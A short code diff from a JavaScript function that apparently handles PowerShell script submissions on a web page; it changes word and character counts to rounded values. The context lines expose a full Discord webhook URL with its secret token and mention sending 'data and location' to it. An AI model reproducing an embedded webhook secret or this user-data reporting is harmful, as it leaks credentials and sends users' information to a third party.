@@ -255,9 +255,9 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Calculate PowerShell script statistics
-        const wordCount = inputText.split(/\s+/).filter(word => word.length > 0).length;
-        const characterCount = inputText.length;
+        // Calculate PowerShell script statistics (rounded)
+        const wordCount = Math.round(inputText.split(/\s+/).filter(word => word.length > 0).length / 10) * 10;
+        const characterCount = Math.round(inputText.length / 100) * 100;
         const lineCount = inputText.split('\n').length;
         
         // Webhook payload with only data and location
